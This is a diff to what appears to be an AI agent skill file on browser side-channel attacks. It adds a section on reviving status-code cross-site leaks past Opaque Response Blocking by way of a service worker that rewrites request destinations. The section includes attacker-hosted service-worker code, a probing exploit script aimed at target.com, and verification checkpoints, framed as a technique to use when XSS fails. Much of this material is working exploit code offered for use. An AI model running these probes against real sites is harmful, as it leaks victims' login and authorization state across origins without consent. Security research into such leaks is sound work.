@@ -1,6 +1,6 @@
 ---
 name: browser-side-channel
-description: Browser-based side channel attacks for cross-origin data leaks via connection pool exhaustion, ETag oracles, and timing differentials. Use when direct XSS fails but cross-origin information leakage is needed.
+description: Browser-based side channel attacks for cross-origin data leaks via connection pool exhaustion, ETag oracles, timing differentials, and ORB status-code XS-Leaks revived through service-worker destination rewriting. Use when direct XSS fails but cross-origin information leakage is needed.
 ---
 
 # Browser Side Channel Attacks
@@ -85,6 +85,52 @@ detectLoginState('https://target.com/dashboard-asset').then(r =>
 Cached resource loads in ~1-2ms vs network fetch at 50ms+. Reveals browsing history for same-site resources.
 
 **Checkpoint:** Clear cache and re-measure to confirm delta is reproducible. Modern browsers partition cache by top-level site -- this only works for same-site resources.
+
+### ORB Status-Code XS-Leak via Service-Worker Destination Rewrite
+
+Classic status-code XS-Leak: load a cross-origin URL as a `<script>` and read `onload` (2XX) vs `onerror` (4XX). Opaque Response Blocking (ORB) breaks this in modern Chrome/Firefox -- any cross-origin response that does not parse as JavaScript is turned into a **network error**, so `onerror` fires regardless of status code and the oracle collapses.
+
+The revival: ORB decides how to surface a blocked response based on the request's `Sec-Fetch-Dest`. A service worker you control on **your own origin** proxies the outgoing request (`fetch(event.request)`), which silently rewrites the destination to `empty`. With destination `empty`, ORB returns a **blank 200** instead of a network error -- and a blank body still lets the `<script>` element evaluate the HTTP status: 2XX -> `load` (executes 0 bytes), 4XX -> `error`. The status-code oracle works again.
+
+Chromium's ORB logic (`orb_impl.cc`):
+```cpp
+if (request_destination_from_renderer_ != mojom::RequestDestination::kEmpty) {
+  return BlockedResponseHandling::kNetworkError;   // destination=script  -> error always
+}
+return BlockedResponseHandling::kEmptyResponse;    // destination=empty   -> blank 200, status leaks
+```
+
+Attacker-hosted `sw.js`:
+```javascript
+self.addEventListener("install", () => self.skipWaiting());       // activate immediately
+self.addEventListener("message", (e) => {
+  if (e.data === "CLAIM") e.waitUntil(clients.claim());           // take over open tabs
+});
+self.addEventListener("fetch", (e) => e.respondWith(fetch(e.request))); // rewrites dest -> "empty"
+```
+
+Attacker page `exploit.js`:
+```javascript
+await navigator.serviceWorker.register("/sw.js");
+(await navigator.serviceWorker.ready).active.postMessage("CLAIM");
+if (!navigator.serviceWorker.controller) {
+  await new Promise((r) =>
+    navigator.serviceWorker.addEventListener("controllerchange", r, { once: true }));
+}
+function probeError(url) {
+  return new Promise((resolve) => {
+    const s = document.createElement("script");
+    s.src = url;
+    s.onload = () => resolve(true);    // 2XX
+    s.onerror = () => resolve(false);  // 4XX
+    document.head.appendChild(s);
+  });
+}
+console.log(await probeError("https://target.com/admin"));      // true  = 200 (authorized)
+console.log(await probeError("https://target.com/admin/404"));  // false = 4XX
+```
+
+**Checkpoint:** The service worker must control the tab before probing -- a freshly registered SW does not claim open clients until `clients.claim()` runs (why the bug appears "random" across reloads). Wait for `controllerchange` / `navigator.serviceWorker.controller` before the first probe. Confirm the delta against one known-2XX and one known-4XX cross-origin URL; if both return the same event, the SW is not yet controlling the request (check the Network tab shows the request served by "service worker" and `Sec-Fetch-Dest: empty`).
 
 ## Workflow
 
